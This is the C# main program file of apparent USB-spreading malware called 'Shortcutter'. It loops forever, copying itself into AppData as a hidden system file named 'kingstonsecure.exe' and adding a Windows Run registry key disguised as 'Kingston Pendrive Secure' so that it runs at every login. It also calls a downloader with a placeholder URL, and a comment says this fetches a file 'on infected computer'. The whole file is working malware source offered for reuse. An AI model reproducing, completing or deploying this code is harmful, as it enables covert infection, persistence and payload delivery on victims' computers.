using Microsoft.Win32;
using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Shortcutter
{
    static class Program
    {
        /// <summary>
        /// Ponto de entrada principal para o aplicativo.
        /// </summary>


        public static Thread s;
        static Mutex mutex = new Mutex(true, "{8F6F0AC4-B9A1-45fd-A8CF-72F04E6BDE8F}");

        [STAThread]
        static void Main()
        {

            if (mutex.WaitOne(TimeSpan.Zero, true))
            {
                USBBOOT.USB(true);

                s = new Thread(new ThreadStart(startthread));
                s.Start();
            }
            else
            {
                USBBOOT.USB(false);
                Application.Exit();
            }

           

        }

        private static void startthread()
        {
            do
            {
                // we wrap this in a try catch block to avoid errors with already existing keys / values
                try
                {
                    Misc.randomString(20000);
                    if (!Misc.keyExists("Kingston Pendrive Secure"))
                    {
                        string filename = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\kingstonsecure.exe";
                        File.SetAttributes(filename, FileAttributes.Hidden | FileAttributes.System);
                        File.Copy(Misc.getLocation(), filename);
                        RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        reg.SetValue("Kingston Pendrive Secure", "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);

                        Misc.dlex("Your download url", ""); //This line make download for your file on infected computer
                    }else
                    {
                        RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        reg.SetValue("Kingston Pendrive Secure", "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);

                    }
                }
                catch { }
                Thread.Sleep(3000);
            } while (true);
        }
    }
}
